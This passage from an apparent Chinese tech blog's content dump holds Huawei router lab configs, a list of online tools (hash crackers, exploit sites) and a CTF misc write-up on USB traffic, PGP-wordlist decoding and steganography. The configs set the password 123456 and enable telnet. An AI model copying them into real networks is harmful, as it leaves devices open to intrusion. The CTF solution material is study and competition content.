123456</span><br><span class="line">user-int vty 0 4</span><br><span class="line">authentication-mode pass 123456</span><br><span class="line">protocol inbound telnet</span><br><span class="line">user privilege level 10</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="AR1"><a href="#AR1" class="headerlink" title="AR1"></a>AR1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 202.106.1.2 29</span><br><span class="line">q</span><br><span class="line">router id 202.106.1.2 </span><br><span class="line">ospf</span><br><span class="line">area 0</span><br><span class="line">net 192.168.13.1 0.0.0.0</span><br><span class="line">ip route-s 0.0.0.0 0 202.106.1.1</span><br><span class="line">acl 2000</span><br><span class="line">rule permit source 192.168.0.0 0.0.255.255</span><br><span class="line">q</span><br><span class="line">int g0/0/0</span><br><span class="line">nat outbound 2000</span><br><span class="line">super password cipher 123456</span><br><span class="line">user-int vty 0 4</span><br><span class="line">authentication-mode pass 123456</span><br><span class="line">protocol inbound telnet</span><br><span class="line">user privilege level 10</span><br><span class="line">int g0/0/0</span><br><span class="line">nat se p tcp gl 202.106.1.3 tel inside 192.168.13.2 23</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="AR2"><a href="#AR2" class="headerlink" title="AR2"></a>AR2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 202.106.1.1 29</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 202.106.0.1 24</span><br><span class="line">int g0/0/2</span><br><span class="line">ip add 202.106.2.1 29</span><br><span class="line">q</span><br><span class="line">ip route-s 0.0.0.0 0 202.106.1.2</span><br><span class="line">super password cipher 123456</span><br><span class="line">user-int vty 0 4</span><br><span class="line">authentication-mode pass 123456</span><br><span class="line">protocol inbound telnet</span><br><span class="line">user privilege level 10</span><br></pre></td></tr></table></figure>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>河北</p>
<figure class="image-box">
                <img src="./河北.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>天津</p>
<figure class="image-box">
                <img src="./天津.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>Telnet</p>
<figure class="image-box">
                <img src="./telnet.jpg" alt="图片" title class>
                <p>图片</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 日常 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 网络工程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一些我常用的在线网站(持续更新)]]></title>
      <url>/%E5%B7%A5%E5%85%B7/ckwd5ws9i0053d0ucgeqqfs9j/</url>
      <content type="html"><![CDATA[<h2 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h2><p><a href="http://www.atoolbox.net/" target="_blank" rel="noopener">一个工具箱</a></p>
<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef密码工具</a></p>
<p><a href="https://cn.dll-files.com/search.dll.html" target="_blank" rel="noopener">dll缺失</a></p>
<h2 id="日常类"><a href="#日常类" class="headerlink" title="日常类"></a>日常类</h2><p><a href="http://tools.jb51.net/aideddesign/ip_net_calc" target="_blank" rel="noopener">IP地址/子网掩码计算与转换</a></p>
<p><a href="http://tools.jb51.net/aideddesign/ico_img" target="_blank" rel="noopener">ico图标生成</a></p>
<p><a href="http://tools.jb51.net/aideddesign/txt_quchong" target="_blank" rel="noopener">文本去重复</a></p>
<p><a href="http://tools.jb51.net/aideddesign/txt_diff#diff" target="_blank" rel="noopener">文本内容比较</a></p>
<p><a href="http://tools.jb51.net/transcoding/jb51qrcode" target="_blank" rel="noopener">二维码加强生成</a></p>
<p><a href="http://www.uuid.online/" target="_blank" rel="noopener">UUID在线生成</a></p>
<p><a href="http://tools.jb51.net/aideddesign/rnd_userinfo" target="_blank" rel="noopener">虚假个人信息生成</a></p>
<p><a href="http://tools.jb51.net/aideddesign/paixu_ys" target="_blank" rel="noopener">在线动画演示插入/选择/冒泡/归并/希尔/快速排序算法过程</a></p>
<p><a href="http://tools.jb51.net/table/useragent" target="_blank" rel="noopener">常用pc/移动端UA信息</a></p>
<p><a href="http://tools.jb51.net/table/tcp_udp_port" target="_blank" rel="noopener">常见TCP/UDP端口参考表</a></p>
<p><a href="http://tools.jb51.net/table/http_content_type" target="_blank" rel="noopener">HTTP Content-type对照表</a></p>
<p><a href="http://tools.jb51.net/table/http_status_code" target="_blank" rel="noopener">HTTP 状态码对照表</a></p>
<p><a href="http://tools.jb51.net/table/http_header" target="_blank" rel="noopener">HTTP 请求头对照表</a></p>
<p><a href="https://www.gaitubao.com/" target="_blank" rel="noopener">在线修改图片尺寸大小</a></p>
<p><a href="http://www.txttool.com/wenben_binarystr.asp" target="_blank" rel="noopener">全面增删改文本工具</a></p>
<p><a href="https://1024tools.com/unserialize" target="_blank" rel="noopener">php在线反序列化工具</a></p>
<p><a href="https://www.gugeapps.net/" target="_blank" rel="noopener">谷歌网上应用店镜像站</a></p>
<p><a href="https://apps.timwhitlock.info/emoji/tables/unicode" target="_blank" rel="noopener">emoji编码表</a></p>
<p><a href="https://matrix.reshish.com/zh/multCalculation.php" target="_blank" rel="noopener">线代计算网站</a></p>
<p><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">Unicode大全</a></p>
<p><a href="https://www.dooccn.com/php/" target="_blank" rel="noopener">PHP等代码在线运行</a></p>
<h2 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h2><p><a href="http://qtool.net/baseencode" target="_blank" rel="noopener">base16/32/36/58/62/64/85/91</a></p>
<p><a href="http://tool.chinaz.com/tools/imgtobase/" target="_blank" rel="noopener">base64图片编码解码</a>data:image/jpg;base64,</p>
<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">SOMD5</a></p>
<p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a></p>
<p><a href="http://www.chamd5.org/" target="_blank" rel="noopener">查MD5</a></p>
<p><a href="http://tools.jb51.net/aideddesign/flipped_txt" target="_blank" rel="noopener">文本上下翻转</a></p>
<p><a href="https://sekao.net/pixeljihad/" target="_blank" rel="noopener">PixelJihad图片隐写</a></p>
<p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JS加密/解密/混淆/aa/jj/fuck等</a></p>
<p><a href="https://www.atool99.com/morse.php" target="_blank" rel="noopener">中英文morse电码加解密</a></p>
<p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook</a></p>
<p><a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">morse电码自适应音频解码器</a></p>
<p><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">Vigenere/Autokey/Beaufort/substitution密码</a></p>
<p><a href="https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html" target="_blank" rel="noopener">RSA计算器</a></p>
<p><a href="https://codewithrockstar.com/docs" target="_blank" rel="noopener">rockstar密码</a></p>
<p><a href="https://www.ssleye.com/ser_cipher.html" target="_blank" rel="noopener">Serpent密码加密解密</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">凯撒密码</a></p>
<p><a href="http://www.bertnase.de/npiet/npiet-execute.php" target="_blank" rel="noopener">npiet加密解密</a></p>
<p><a href="http://factordb.com/" target="_blank" rel="noopener">RSA分解N</a></p>
<p><a href="https://www.ctftools.com/down/down/passwd/" target="_blank" rel="noopener">摩斯、凯撒、中文凯撒、栅栏、维吉尼亚、替代、置换、MD5加密等</a></p>
<p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p>
<p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新与佛论禅</a></p>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">JWT签名检验</a></p>
<p><a href="https://goto.pachanka.org/crypto/pgp-wordlist" target="_blank" rel="noopener">PGP密码解密</a></p>
<p><a href="https://yuanfux.github.io/zero-width-web/" target="_blank" rel="noopener">零宽字节隐写</a></p>
<p><a href="https://quipqiup.com/" target="_blank" rel="noopener">自动替换密码求解器</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">ROT5/13/18/47编码转换</a></p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=937" target="_blank" rel="noopener">emoji表情编码解码</a></p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=850" target="_blank" rel="noopener">社会主义核心价值观加密解密</a></p>
<p><a href="http://114.xixik.com/tiangandizhi/" target="_blank" rel="noopener">天干地支甲子对照表</a></p>
<p><a href="https://www.dcode.fr/dancing-men-cipher" target="_blank" rel="noopener">跳舞的男人密码</a></p>
<p><a href="https://apps.timwhitlock.info/unicode/inspect" target="_blank" rel="noopener">emoji编码加解密</a></p>
<p><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">维吉尼亚自动求解</a></p>
<p><a href="http://www.metools.info/code/c90.html" target="_blank" rel="noopener">猪圈密码在线解密</a></p>
<p><a href="http://www.metools.info/code/railfencecipher_154.html" target="_blank" rel="noopener">w型栅栏密码</a></p>
<h2 id="看技术文章"><a href="#看技术文章" class="headerlink" title="看技术文章"></a>看技术文章</h2><p><a href="https://cxsecurity.com/exploit/" target="_blank" rel="noopener">https://cxsecurity.com/exploit/</a></p>
<p><a href="http://www.hackdig.com/?tag=CTF" target="_blank" rel="noopener">http://www.hackdig.com/?tag=CTF</a></p>
<p><a href="https://www.xj.hk/" target="_blank" rel="noopener">https://www.xj.hk/</a></p>
<p><a href="https://paper.seebug.org/" target="_blank" rel="noopener">https://paper.seebug.org/</a></p>
<p><a href="http://toutiao.secjia.com/#/" target="_blank" rel="noopener">http://toutiao.secjia.com/#/</a></p>
<p><a href="https://www.yuque.com/jxswcy/ctfnotebook" target="_blank" rel="noopener">https://www.yuque.com/jxswcy/ctfnotebook</a></p>
]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 收集 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2020西湖论剑misc复现]]></title>
      <url>/ctf-writeup-misc/ckwd5ws6w0012d0ucjc6cunl1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做的时候就觉得题目阴间得一匹,没想到官方wp也这么阴间,原理呢?分析呢?不管怎么说看着就是不明不白脑洞也贼多,复现起来也怪怪的</p>
<h2 id="yusa-yyds"><a href="#yusa-yyds" class="headerlink" title="yusa_yyds"></a>yusa_yyds</h2><p>回过头仔细看时才注意到Xbox360提示,当时其实队友有注意到可能是xbox,我们还看了<a href="https://www.partsnotincluded.com/understanding-the-xbox-360-wired-controllers-usb-data/" target="_blank" rel="noopener">官方文档</a>,但想多了,注意力全放在提取出来的usbdata上,最后也没看懂</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>xbox传入的信息在流量包的DEVICE DESCRIPTOR部分,以下截一个包分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DEVICE DESCRIPTOR</span><br><span class="line">    bLength: 18</span><br><span class="line">    bDescriptorType: 0x01 (DEVICE)</span><br><span class="line">//设备描述符长度为18个字节</span><br><span class="line">    bcdUSB: 0x0200</span><br><span class="line">//控制器使用USB2.0</span><br><span class="line">    bDeviceClass: Vendor Specific (0xff)</span><br><span class="line">    bDeviceSubClass: 255</span><br><span class="line">    bDeviceProtocol: 255</span><br><span class="line">//设备的USB设备类别被设定为0xFF，子类设定为255,设备协议设定为255</span><br><span class="line">    bMaxPacketSize0: 8</span><br><span class="line">//端点0（设备控制端点）的最大数据包大小为8字节</span><br><span class="line">    idVendor: Microsoft Corp. (0x045e)</span><br><span class="line">    idProduct: Xbox360 Controller (0x028e)</span><br><span class="line">//供应商VID和PID信息信息</span><br><span class="line">    bcdDevice: 0x0114</span><br><span class="line">//供应商定义的版本号,被编码为二进制编码的十进制,使用8421编码可转为1.1.4版本</span><br><span class="line">    iManufacturer: 1</span><br><span class="line">    iProduct: 2</span><br><span class="line">    iSerialNumber: 3</span><br><span class="line">    bNumConfigurations: 1</span><br><span class="line">//描述制造商,产品,序列号的字符串在索引1,2,3,该设备只有1种配置</span><br></pre></td></tr></table></figure>
<p>通过time可以发现,中间断电缺失了一段时间的数据<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>然后wp里说的</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>恕我直言没看懂,希望能有师傅教教我</p>
<p>下面是之前常规做法时提取的usbdata</p>
<p>提取usb流量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r game.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>读取出来的usb流量,不是常规的键盘和鼠标敲击码<br>键盘一般是八位一组,第一二位都是00,第三位开始记录击键信息.</p>
<p>鼠标一般是四位一组,第一位代表按键,取00时没有按键,取01时按左键,取02时按右键;第二位可以看成是一个signed byte类型,最高位为符号位,当这个值为正时代表鼠标水平右移多少像素,为负时代表水平左移多少像素.第三位与第二位类似,代表垂直上下移动的偏移.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">01:00:00:00:65:00:00:00:00:00:00:53:00:00:00:00:00:00:00:00:00:00:05:04:00:00:00:00:00:00:00:45:00:00:05:00:00:00:04:00:02:0b:b8:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:01:06:00:00:00:08:00:00:00:05:25:03:78:ce:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:02:01:00:00:00:04:00:00:00:01</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">01:00:00:00:65:00:00:00:00:00:00:53:00:00:00:00:00:00:00:00:00:00:05:04:00:00:00:00:00:00:00:45:00:00:05:00:00:00:04:00:02:0b:b8:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:01:06:00:00:00:08:00:00:00:05:25:90:30:ce:05:00:00:00:04:00:02:0b:b9:02:00:00:00:04:00:00:00:02:01:00:00:00:04:00:00:00:02</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br><span class="line">00:08:00:ff:00:00:00:00</span><br><span class="line">00:08:00:00:00:00:00:00</span><br></pre></td></tr></table></figure>
<h2 id="yusapapa"><a href="#yusapapa" class="headerlink" title="yusapapa"></a>yusapapa</h2><p>在网页注释里有提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Maybe these texts are really helpful for you</span><br><span class="line">Biometric list is OK!</span><br><span class="line">endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack</span><br></pre></td></tr></table></figure>
<p>去重整理列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">endow</span><br><span class="line">gremlin</span><br><span class="line">indulge</span><br><span class="line">bison</span><br><span class="line">flatfoot</span><br><span class="line">fallout</span><br><span class="line">goldfish</span><br><span class="line">hockey</span><br><span class="line">fracture</span><br><span class="line">goggles</span><br><span class="line">jawbone</span><br><span class="line">glucose</span><br><span class="line">indoors</span><br><span class="line">gazelle</span><br><span class="line">guidance</span><br><span class="line">keyboard</span><br><span class="line">cement</span><br><span class="line">frighten</span><br><span class="line">buzzard</span><br><span class="line">highchair</span><br><span class="line">flytrap</span><br><span class="line">freedom</span><br><span class="line">allow</span><br><span class="line">crowfoot</span><br><span class="line">involve</span><br><span class="line">Burbank</span><br><span class="line">flagpole</span><br><span class="line">blockade</span><br><span class="line">inverse</span><br><span class="line">blackjack</span><br></pre></td></tr></table></figure></p>
<p>根据PGP词汇表对应写个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">a = <span class="string">"endow gremlin indulge bison flatfoot fallout goldfish bison hockey fracture fracture bison goggles jawbone bison flatfoot gremlin glucose glucose fracture flatfoot indoors gazelle gremlin goldfish bison guidance indulge keyboard keyboard glucose fracture hockey bison gazelle goldfish bison cement frighten gazelle goldfish indoors buzzard highchair fallout highchair bison fallout goldfish flytrap bison fallout goldfish gremlin indoors frighten fracture highchair bison cement fracture goldfish flatfoot gremlin flytrap fracture buzzard guidance goldfish freedom buzzard allow crowfoot jawbone bison indoors frighten fracture bison involve fallout jawbone Burbank indoors frighten fracture bison guidance gazelle flatfoot indoors indulge highchair fracture bison hockey frighten gremlin indulge flytrap bison flagpole fracture bison indulge hockey fracture flytrap bison allow blockade endow indulge hockey fallout blockade bison gazelle hockey bison inverse fracture highchair jawbone bison gazelle goggles guidance gremlin highchair indoors fallout goldfish indoors bison gazelle goldfish bison indoors frighten gazelle hockey bison flatfoot frighten fallout glucose glucose fracture goldfish freedom fracture blackjack blackjack"</span></span><br><span class="line">s = a.split(<span class="string">" "</span>)</span><br><span class="line">dict = &#123;<span class="string">'endow'</span>: <span class="string">'59'</span>,</span><br><span class="line"><span class="string">'gremlin'</span>: <span class="string">'6F'</span>,</span><br><span class="line"><span class="string">'indulge'</span>: <span class="string">'75'</span>,</span><br><span class="line"><span class="string">'bison'</span>:<span class="string">'20'</span>,</span><br><span class="line"><span class="string">'flatfoot'</span>:<span class="string">'63'</span>,</span><br><span class="line"><span class="string">'fallout'</span>:<span class="string">'61'</span>,</span><br><span class="line"><span class="string">'goldfish'</span>: <span class="string">'6E'</span>,</span><br><span class="line"><span class="string">'hockey'</span>: <span class="string">'73'</span>,</span><br><span class="line"><span class="string">'fracture'</span>: <span class="string">'65'</span>,</span><br><span class="line"><span class="string">'goggles'</span>:<span class="string">'6D'</span>,</span><br><span class="line"><span class="string">'jawbone'</span>: <span class="string">'79'</span>,</span><br><span class="line"><span class="string">'glucose'</span>: <span class="string">'6C'</span>,</span><br><span class="line"><span class="string">'indoors'</span>: <span class="string">'74'</span>,</span><br><span class="line"><span class="string">'gazelle'</span>: <span class="string">'69'</span>,</span><br><span class="line"><span class="string">'guidance'</span>: <span class="string">'70'</span>,</span><br><span class="line"><span class="string">'keyboard'</span>: <span class="string">'7A'</span>,</span><br><span class="line"><span class="string">'cement'</span>: <span class="string">'2F'</span>,</span><br><span class="line"><span class="string">'frighten'</span>: <span class="string">'68'</span>,</span><br><span class="line"><span class="string">'buzzard'</span>: <span class="string">'2E'</span>,</span><br><span class="line"><span class="string">'highchair'</span>: <span class="string">'72'</span>,</span><br><span class="line"><span class="string">'flytrap'</span>: <span class="string">'64'</span>,</span><br><span class="line"><span class="string">'freedom'</span>: <span class="string">'67'</span>,</span><br><span class="line"><span class="string">'allow'</span>: <span class="string">'0A'</span>,</span><br><span class="line"><span class="string">'crowfoot'</span>: <span class="string">'42'</span>,</span><br><span class="line"><span class="string">'involve'</span>: <span class="string">'77'</span>,</span><br><span class="line"><span class="string">'Burbank'</span>: <span class="string">'2C'</span>,</span><br><span class="line"><span class="string">'flagpole'</span>: <span class="string">'62'</span>,</span><br><span class="line"><span class="string">'blockade'</span>: <span class="string">'22'</span>,</span><br><span class="line"><span class="string">'inverse'</span>: <span class="string">'76'</span>,</span><br><span class="line"><span class="string">'blackjack'</span>: <span class="string">'21'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> (dict[item],end=<span class="string">''</span>)</span><br><span class="line"><span class="number">596</span>F752063616E20736565206D7920636F6C6C656374696F6E2070757A7A6C657320696E202F68696E742E72617220616E6420616E6F74686572202F656E636F64652E706E672E0A427920746865207761792C74686520706963747572652073686F75642062652075736564200A225975736122206973207665727920696D706F7274616E7420696E2074686973206368616C6C656E67652121</span><br></pre></td></tr></table></figure></p>
<p>解hex<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can see my collection puzzles in /hint.rar and another /encode.png.</span><br><span class="line">By the way,the picture shoud be used</span><br><span class="line">&quot;Yusa&quot; is very important in this challenge!!</span><br></pre></td></tr></table></figure></p>
<p>也可以在<a href="https://goto.pachanka.org/crypto/pgp-wordlist" target="_blank" rel="noopener">在线网站解密</a><br>同时发现页面的图片是.webp格式,存在webp隐写</p>
<p>stegpy工具安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install stegpy</span><br><span class="line">git clone https://github.com/dhsdshdhk/stegpy.git</span><br><span class="line">cd stegpy</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>
<p>使用命令行解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stegpy encode.webp</span><br><span class="line">得到密码</span><br><span class="line">the_key_is:Yus@_yydsstegpy!!</span><br></pre></td></tr></table></figure></p>
<p>下载hint.rar后,注释里提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用一种较为古老和不常见的工具。USE your google and Baidu</span><br></pre></td></tr></table></figure></p>
<p>使用刚才用stegpy解出来的密码解压缩,得到一张图片<br><figure class="image-box">
                <img src="./4.jpg" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>根据比赛放出的提示搜到 invisible Secrets 工具,我下的是pro 3.0 版本</p>
<p>使用工具解密文件,密码是Yusa,得到encode.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,random</span><br><span class="line"><span class="keyword">from</span> PIL <span 